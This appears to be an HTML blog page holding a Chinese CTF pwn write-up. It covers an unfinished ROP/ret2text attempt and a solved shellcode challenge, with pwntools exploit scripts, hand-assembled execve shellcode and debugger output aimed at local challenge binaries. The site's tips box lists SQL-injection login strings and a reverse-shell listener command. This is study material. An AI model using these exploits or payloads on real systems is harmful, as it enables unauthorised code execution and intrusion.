@@ -1,0 +1,353 @@
+<!DOCTYPE html>
+<html lang="zh-CN" data-theme="dark">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="theme-color" content="#080b10">
+  
+  <title>pwn--rop+ret2text · whymm</title>
+  <meta name="description" content="关于 Web、Pwn、Crypto、Reverse、Misc 与区块链的 CTF 解题复盘、工具链和安全研究笔记。">
+  <meta name="author" content="whymm">
+  <meta name="keywords" content="Pwn,ROP,ret2text,shellcode,Pwn">
+  <link rel="canonical" href="https://whymm.com.cn/2026/11/20/pwn-rop-ret2text/">
+  <link rel="alternate" type="application/atom+xml" title="pwn--rop+ret2text · whymm" href="/atom.xml">
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="pwn--rop+ret2text · whymm">
+  <meta property="og:description" content="关于 Web、Pwn、Crypto、Reverse、Misc 与区块链的 CTF 解题复盘、工具链和安全研究笔记。">
+  <meta property="og:site_name" content="whymm">
+  <meta property="og:url" content="https://whymm.com.cn/2026/11/20/pwn-rop-ret2text/">
+  <meta property="og:locale" content="zh_CN">
+  <meta property="og:image" content="https://whymm.com.cn/img/og.png">
+  <meta property="og:image:width" content="1200">
+  <meta property="og:image:height" content="630">
+  <meta property="og:image:alt" content="pwn--rop+ret2text · whymm">
+  
+  <meta property="article:published_time" content="2026-11-20T14:00:00.000Z">
+  <meta property="article:modified_time" content="2026-11-22T09:15:00.908Z">
+  
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="pwn--rop+ret2text · whymm">
+  <meta name="twitter:description" content="关于 Web、Pwn、Crypto、Reverse、Misc 与区块链的 CTF 解题复盘、工具链和安全研究笔记。">
+  <meta name="twitter:image" content="https://whymm.com.cn/img/og.png">
+  <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='8' fill='%23080b10'/%3E%3Cpath d='M8 21l4.2-11 3.8 8.2 3.8-8.2L24 21' stroke='%2335e0a1' stroke-width='2.6' fill='none' stroke-linecap='round' stroke-linejoin='round'/%3E%3C/svg%3E">
+  <link rel="stylesheet" href="/css/main.css">
+  <link rel="stylesheet" href="/css/post.css">
+  <script>
+    (function () {
+      try {
+        var t = localStorage.getItem('whymm-theme');
+        if (t === 'light' || t === 'dark') document.documentElement.setAttribute('data-theme', t);
+      } catch (e) {}
+    })();
+  </script>
+<meta name="generator" content="Hexo 8.1.2"></head>
+
+<body class="is-post">
+  <div class="bg-grid" aria-hidden="true"></div>
+  <div class="progress" id="progressBar" aria-hidden="true"></div>
+  <header class="site-header">
+  <div class="wrap header-inner">
+    <a class="brand" href="/">
+      <span class="brand-mark" aria-hidden="true">W</span>
+      <span class="brand-name">whymm</span>
+      <span class="brand-caret" aria-hidden="true">_</span>
+    </a>
+
+    <nav class="nav" id="siteNav" aria-label="主导航">
+      
+      <a class="nav-link" href="/">首页</a>
+      
+      <a class="nav-link" href="/archives/">归档</a>
+      
+      <a class="nav-link" href="/categories/">分类</a>
+      
+      <a class="nav-link" href="/tags/">标签</a>
+      
+      <a class="nav-link" href="/about/">关于</a>
+      
+    </nav>
+
+    <div class="header-actions">
+      
+      <button class="icon-btn" id="searchBtn" type="button" aria-label="搜索（Ctrl+K）">
+        <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><circle cx="11" cy="11" r="7"/><path d="M20 20l-3.5-3.5"/></svg>
+      </button>
+      
+      
+      <button class="icon-btn theme-toggle" id="themeBtn" type="button" aria-label="切换明暗主题">
+        <svg class="i-moon" viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.8A9 9 0 1111.2 3a7 7 0 009.8 9.8z"/></svg>
+        <svg class="i-sun" viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><circle cx="12" cy="12" r="4"/><path d="M12 2v2M12 20v2M4.9 4.9l1.4 1.4M17.7 17.7l1.4 1.4M2 12h2M20 12h2M4.9 19.1l1.4-1.4M17.7 6.3l1.4-1.4"/></svg>
+      </button>
+      
+      <button class="icon-btn nav-btn" id="navBtn" type="button" aria-label="打开菜单" aria-expanded="false">
+        <svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M4 7h16M4 12h16M4 17h16"/></svg>
+      </button>
+    </div>
+  </div>
+</header>
+
+  <main class="site-main">
+<article class="post">
+  <div class="wrap post-wrap">
+    <header class="post-header">
+      <div class="breadcrumb">
+        <a href="/">~</a>
+        <span>/</span>
+        
+        <a href="/categories/Pwn/">Pwn</a>
+        <span>/</span>
+        
+        <span class="breadcrumb-current">pwn--rop+ret2text</span>
+      </div>
+      <h1 class="post-title">pwn--rop+ret2text</h1>
+      <div class="post-meta">
+        <span class="post-meta-item">
+          <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3.5" y="5" width="17" height="16" rx="2.5"/><path d="M8 3v4M16 3v4M3.5 10h17"/></svg>
+          <time datetime="2026-11-20T14:00:00.000Z">2026-11-20</time>
+        </span>
+        <span class="post-meta-item">
+          <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="9"/><path d="M12 7.5V12l3 2"/></svg>
+          7 分钟阅读
+        </span>
+        <span class="post-meta-item">2449 字</span>
+        
+        
+        <span class="post-meta-item post-author">
+          <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="8" r="3.6"/><path d="M4.5 20c1.2-3.6 4-5.4 7.5-5.4s6.3 1.8 7.5 5.4"/></svg>
+          wu_m1ng
+        </span>
+        
+        
+        <span class="post-meta-item" id="busuanzi_container_page_pv" style="display:none">
+          <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M2 12s3.6-6.5 10-6.5S22 12 22 12s-3.6 6.5-10 6.5S2 12 2 12z"/><circle cx="12" cy="12" r="2.6"/></svg>
+          <span id="busuanzi_value_page_pv">0</span> 次阅读
+        </span>
+        
+        
+        <a class="chip chip-cat" href="/categories/Pwn/" style="--c: #ff5c7a">Pwn</a>
+        
+      </div>
+    </header>
+
+    <div class="post-layout">
+      <div class="post-main">
+        
+        <details class="toc-mobile">
+          <summary>目录</summary>
+          <div class="toc-mobile-body"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#pwn%E2%80%93rop-ret2text"><span class="toc-text">pwn–rop+ret2text</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn%E2%80%93shellcode"><span class="toc-text">pwn–shellcode</span></a></li></ol></li></ol></div>
+        </details>
+        
+
+        <div class="post-content" id="postContent"><h1 id="pwn–rop-ret2text"><a href="#pwn–rop-ret2text" class="headerlink" title="pwn–rop+ret2text"></a>pwn–rop+ret2text</h1><p>依旧是上周卡我7，8个小时的题目</p>
+<p>首先我们要调用<code>read</code>函数将<code>/bin/sh</code>写入<code>.bss</code>段，而且还只能写24字节</p>
+<p>错误示例：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">34085</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">nameplate_addr=<span class="number">0x4040A0</span></span><br><span class="line">takemassage_addr=<span class="number">0x401260</span></span><br><span class="line">pop_rdi_addr=<span class="number">0x401250</span></span><br><span class="line">system_plt=<span class="number">0x401080</span></span><br><span class="line">read_plt = <span class="number">0x401090</span></span><br><span class="line">payload1=<span class="string">b&#x27;A&#x27;</span>*<span class="number">88</span>+p64(pop_rdi_addr)+p64(nameplate_addr)+p64(read_plt)</span><br><span class="line">payload2=<span class="string">b&#x27;A&#x27;</span>*<span class="number">80</span>+p64(pop_rdi_addr)+p64(nameplate_addr)+p64(system_plt)</span><br><span class="line">p.send(payload1)</span><br><span class="line">p.send(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.send(payload2)</span><br><span class="line">p.interactive</span><br></pre></td></tr></table></figure>
+
+<p>将<code>/bin/sh</code>写入<code>.bss</code>后不知道该如何控制返回地址</p>
+<p>导致无法回到<code>take_massage</code>再次读取</p>
+<p>出题人提示：试着动调一下，看看第一次<code>read</code>后寄存器的残留，想办法把<code>rsi</code>指向<code>.bss</code>，触发第二次<code>read</code></p>
+<p>思考ing</p>
+<h2 id="pwn–shellcode"><a href="#pwn–shellcode" class="headerlink" title="pwn–shellcode"></a>pwn–shellcode</h2><p>检查保护机制</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">xiaowu@localhost:~/Downloads/shellcodegate$ pwn checksec pwn</span><br><span class="line">[*] &#x27;/home/xiaowu/Downloads/shellcodegate/pwn&#x27;</span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Full RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        PIE enabled</span><br></pre></td></tr></table></figure>
+
+<p>与寻常的不一样，这题开了NX</p>
+<p>拖进IDA</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">buf = mmap(addr: nullptr, len: <span class="number">0x1000u</span>, prot: <span class="number">7</span>, flags: <span class="number">34</span>, fd: <span class="number">-1</span>, offset: <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> ( buf == (<span class="type">void</span> *)<span class="number">-1LL</span> )</span><br><span class="line">&#123;</span><br><span class="line">  perror(s: <span class="string">&quot;mmap&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(status: <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( read(fd: <span class="number">0</span>, buf, nbytes: <span class="number">0xFu</span>) &lt;= <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(s: <span class="string">&quot;No shellcode?&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(status: <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">clean_and_jump(buf);</span><br><span class="line">_libc_csu_init();</span><br><span class="line"><span class="keyword">return</span> result;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">public clean_and_jump</span><br><span class="line">clean_and_jump proc near</span><br><span class="line"></span><br><span class="line">buf= qword ptr <span class="number">-48</span>h</span><br><span class="line">shellcode_addr= qword ptr <span class="number">-40</span>h</span><br><span class="line">var_38= qword ptr <span class="number">-38</span>h</span><br><span class="line"></span><br><span class="line">; __unwind &#123;</span><br><span class="line">endbr64</span><br><span class="line">push    rbp</span><br><span class="line">mov     rbp, rsp</span><br><span class="line">push    r15</span><br><span class="line">push    r14</span><br><span class="line">push    r13</span><br><span class="line">push    r12</span><br><span class="line">push    rbx</span><br><span class="line">mov     [rbp+buf], rdi</span><br><span class="line">mov     rax, fs:<span class="number">28</span>h</span><br><span class="line">mov     [rbp+var_38], rax</span><br><span class="line">xor     eax, eax</span><br><span class="line">mov     rax, [rbp+buf]</span><br><span class="line">mov     [rbp+shellcode_addr], rax</span><br><span class="line">mov     r15, [rbp+shellcode_addr]</span><br><span class="line">lea     rax, [r15+<span class="number">8</span>]</span><br><span class="line">push    rax</span><br><span class="line">xor     rax, rax</span><br><span class="line">xor     rbx, rbx</span><br><span class="line">xor     rcx, rcx</span><br><span class="line">xor     rdx, rdx</span><br><span class="line">xor     rsi, rsi</span><br><span class="line">xor     rdi, rdi</span><br><span class="line">xor     r8, r8</span><br><span class="line">xor     r9, r9</span><br><span class="line">xor     r10, r10</span><br><span class="line">xor     r11, r11</span><br><span class="line">xor     r12, r12</span><br><span class="line">xor     r13, r13</span><br><span class="line">xor     r14, r14</span><br><span class="line">retn</span><br><span class="line">; &#125; <span class="comment">// starts at 11E9</span></span><br><span class="line">clean and jump endp ; sp-analysis failed</span><br></pre></td></tr></table></figure>
+
+<p>看<code>clean and jump</code>的汇编</p>
+<p>由图可以看到清零了众多寄存器，但<code>r15</code>保持不变</p>
+<p>而且程序从<code>buf</code>的第9个字节开始执行</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lea     rax, [r15+<span class="number">8</span>]</span><br><span class="line">push    rax</span><br></pre></td></tr></table></figure>
+
+<p><code>rsp=buf+8</code></p>
+<p>用gdb调试后发现</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">r15    0x7ffff7fba000</span><br><span class="line"></span><br><span class="line">RSP    0x7fffffffdbb0 → 0x7ffff7fba008</span><br></pre></td></tr></table></figure>
+
+<p>故<code>r15=buf</code></p>
+<p>先构造一段rop链，并用asm生成一段机器码</p>
+<p><code>push r15; pop rdi</code>：利用程序保留下来的缓冲区地址，让 RDI 指向 &#x2F;bin&#x2F;sh</p>
+<p><code>al</code>（rax的最低8位，一个字节）：利用 rax 已经为零的条件，把 RAX 设置为 59</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push r15</span><br><span class="line">pop rdi</span><br><span class="line">mov al, <span class="number">0x3b</span></span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">41 57        push    r15</span><br><span class="line">5f           pop     rdi</span><br><span class="line">b0 3b        mov     al, 0x3b</span><br><span class="line">0f 05        syscall</span><br></pre></td></tr></table></figure>
+
+<p>攻击脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.clear(arch=<span class="string">&quot;amd64&quot;</span>, os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line">io=remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">44563</span>)</span><br><span class="line">shellcode = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;41575fb03b0f05&quot;</span>)</span><br><span class="line">payload = <span class="string">b&quot;/bin/sh\x00&quot;</span>+ shellcode</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Submit your shellcode:&quot;</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<!-- pages: 4 -->
+</div>
+
+        
+        <div class="post-tags">
+          <span class="post-tags-label">#</span>
+          
+          <a class="chip" href="/tags/Pwn/">Pwn</a>
+          
+          <a class="chip" href="/tags/ROP/">ROP</a>
+          
+          <a class="chip" href="/tags/ret2text/">ret2text</a>
+          
+          <a class="chip" href="/tags/shellcode/">shellcode</a>
+          
+        </div>
+        
+
+        <div class="post-end">
+          <span class="post-end-line"></span>
+          <span class="post-end-text">EOF</span>
+          <span class="post-end-line"></span>
+        </div>
+
+        <nav class="post-nav">
+          
+          <a class="post-nav-item" href="/2026/11/20/pwn-tiny-xor/">
+            <span class="post-nav-dir">← 上一篇</span>
+            <span class="post-nav-title">pwn--tiny--XOR解码</span>
+          </a>
+          
+          
+          <a class="post-nav-item post-nav-next" href="/2026/11/20/pwn-fmtstr/">
+            <span class="post-nav-dir">下一篇 →</span>
+            <span class="post-nav-title">pwn--格式化字符串泄露</span>
+          </a>
+          
+        </nav>
+
+        
+
+<section class="comments" id="comments">
+  <div class="comments-head">
+    <h2 class="comments-title"><span class="t-prompt">//</span> 评论</h2>
+    <span class="comments-sub">用 GitHub 账号登录后发言</span>
+  </div>
+  <div class="giscus-wrap">
+    <script src="https://giscus.app/client.js"
+      data-repo="whymm-fl/whymm-fl.github.io"
+      data-repo-id="R_kgDOVvROcA"
+      data-category="Announcements"
+      data-category-id="DIC_kwDOVvROcM4DLPtx"
+      data-mapping="pathname"
+      data-strict="0"
+      data-reactions-enabled="1"
+      data-emit-metadata="0"
+      data-input-position="top"
+      data-theme="dark"
+      data-lang="zh-CN"
+      crossorigin="anonymous"
+      async>
+    </script>
+  </div>
+</section>
+
+
+      </div>
+
+      
+      <aside class="post-aside">
+        <div class="toc-wrap">
+          <div class="toc-title"><span>目录</span><b>TOC</b></div>
+          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#pwn%E2%80%93rop-ret2text"><span class="toc-text">pwn–rop+ret2text</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn%E2%80%93shellcode"><span class="toc-text">pwn–shellcode</span></a></li></ol></li></ol>
+        </div>
+      </aside>
+      
+    </div>
+  </div>
+</article>
+</main>
+  
+
+<section class="quote-band" aria-label="名言与小知识">
+  <div class="wrap">
+    <div class="quote-card" id="quoteCard">
+      <div class="quote-mark" aria-hidden="true">&ldquo;</div>
+      
+      <p class="quote-text" id="quoteText">Programs must be written for people to read, and only incidentally for machines to execute.</p>
+      <p class="quote-author" id="quoteAuthor">&mdash; Harold Abelson</p>
+      
+      
+      <p class="quote-tip"><span class="quote-tip-label">// 小知识</span><span id="quoteTip"><code>git log -p --all</code> 能在 <code>.git</code> 泄露的题目里翻出被删掉的 flag。</span></p>
+      
+    </div>
+  </div>
+</section>
+<script type="application/json" id="quoteData">{"quotes":[{"text":"Talk is cheap. Show me the code.","author":"Linus Torvalds"},{"text":"Simplicity is prerequisite for reliability.","author":"Edsger W. Dijkstra"},{"text":"Premature optimization is the root of all evil.","author":"Donald Knuth"},{"text":"Programs must be written for people to read, and only incidentally for machines to execute.","author":"Harold Abelson"},{"text":"Security is a process, not a product.","author":"Bruce Schneier"},{"text":"Debugging is twice as hard as writing the code in the first place.","author":"Brian W. Kernighan"},{"text":"Any sufficiently advanced technology is indistinguishable from magic.","author":"Arthur C. Clarke"},{"text":"Make it work, make it right, make it fast.","author":"Kent Beck"},{"text":"纸上得来终觉浅，绝知此事要躬行。","author":"陆游"},{"text":"Stay hungry, stay foolish.","author":"Steve Jobs"},{"text":"落日心犹壮，秋风病欲苏。","author":"杜甫"},{"text":"为天地立心，为生民立命，为往圣继绝学，为万世开太平。","author":"张载"},{"text":"应是天仙狂醉，乱把白云揉碎。","author":"李白"}],"tips":["\u003ccode\u003ecurl -s -o /dev/null -w \"%{http_code}\" \u0026lt;url\u0026gt;\u003c/code\u003e 只看状态码，批量探活很省事。","\u003ccode\u003epython3 -m http.server 8000\u003c/code\u003e 一句话起个文件服务，传 payload 最方便。","\u003ccode\u003estrings -n 8 ./chall | less\u003c/code\u003e 先抓二进制里的可见字符串，比手动翻快得多。","\u003ccode\u003ebinwalk -e firmware.bin\u003c/code\u003e 解固件，\u003ccode\u003eexiftool pic.jpg\u003c/code\u003e 看图片元数据。","\u003ccode\u003etcpdump -i any -w out.pcap port 80\u003c/code\u003e 抓包，Wireshark 里按 \u003ccode\u003ehttp.request\u003c/code\u003e 过滤。","登录框先试 \u003ccode\u003e' or 1=1-- -\u003c/code\u003e、\u003ccode\u003eadmin' -- -\u003c/code\u003e，能进就是字符型注入。","\u003ccode\u003egit log -p --all\u003c/code\u003e 能在 \u003ccode\u003e.git\u003c/code\u003e 泄露的题目里翻出被删掉的 flag。","\u003ccode\u003enc -lvnp 4444\u003c/code\u003e 起监听前，先确认目标能不能出网。","拿到 RSA 密文先看长度：e、n 大小不对劲往往就是攻击点。","\u003ccode\u003egrep -rn \"flag{\" .\u003c/code\u003e 是赛后复盘找遗漏的最快方式。"]}</script>
+
+
+  <footer class="site-footer">
+  <div class="wrap">
+    <div class="footer-grid">
+      <div class="footer-about">
+        <div class="footer-brand">whymm<span class="caret">_</span></div>
+        <p class="footer-motto">Stay curious, keep pwning.</p>
+      </div>
+      <div class="footer-nav">
+        <div class="footer-nav-col">
+          <div class="footer-label">// 导航</div>
+          
+          <a href="/">首页</a>
+          
+          <a href="/archives/">归档</a>
+          
+          <a href="/categories/">分类</a>
+          
+          <a href="/tags/">标签</a>
+          
+          <a href="/about/">关于</a>
+          
+        </div>
+        <div class="footer-nav-col">
+          <div class="footer-label">// 联系</div>
+          
+          <a href="https://github.com/whymm-fl" target="_blank" rel="noopener">GitHub</a>
+          
+          
+          <a href="/atom.xml">RSS 订阅</a>
+          <a href="/sitemap.xml">站点地图</a>
+        </div>
+      </div>
+    </div>
+    
+    <div class="footer-bottom">
+      <span>© 2026 whymm</span>
+      <span class="dot-sep">·</span>
+      <span>Powered by <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a></span>
+      <span class="dot-sep">·</span>
+      <span>Theme <b>whymm</b></span>
+      
+      <span class="footer-stats" id="busuanzi_container_site_pv" style="display:none"><span class="dot-sep">·</span><span id="busuanzi_value_site_pv">0</span> 次访问</span>
+      <span class="footer-stats" id="busuanzi_container_site_uv" style="display:none"><span class="dot-sep">·</span><span id="busuanzi_value_site_uv">0</span> 位访客</span>
+      
+    </div>
+  </div>
+</footer>
+
+  <div class="search-layer" id="searchLayer" aria-hidden="true">
+  <div class="search-backdrop" data-close="search"></div>
+  <div class="search-panel" role="dialog" aria-modal="true" aria-label="站内搜索">
+    <div class="search-head">
+      <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><circle cx="11" cy="11" r="7"/><path d="M20 20l-3.5-3.5"/></svg>
+      <input id="searchInput" type="search" placeholder="搜索标题、分类、标签或正文…" autocomplete="off" spellcheck="false" data-search-url="/search.json">
+      <button class="search-close" type="button" data-close="search" aria-label="关闭">ESC</button>
+    </div>
+    <div class="search-body" id="searchResults">
+      <div class="search-empty">
+        <div class="search-empty-icon">⌘K</div>
+        <p>输入关键词开始搜索</p>
+        <span>支持标题、分类、标签与正文全文匹配</span>
+      </div>
+    </div>
+  </div>
+</div>
+
+  <button class="to-top" id="toTop" type="button" aria-label="回到顶部">
+    <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 19V5M5 12l7-7 7 7"/></svg>
+  </button>
+  <div class="img-viewer" id="imgViewer" aria-hidden="true"><img alt=""></div>
+  <script src="/js/main.js" defer></script>
+  <script src="/js/search.js" defer></script>
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  
+</body>
+</html>
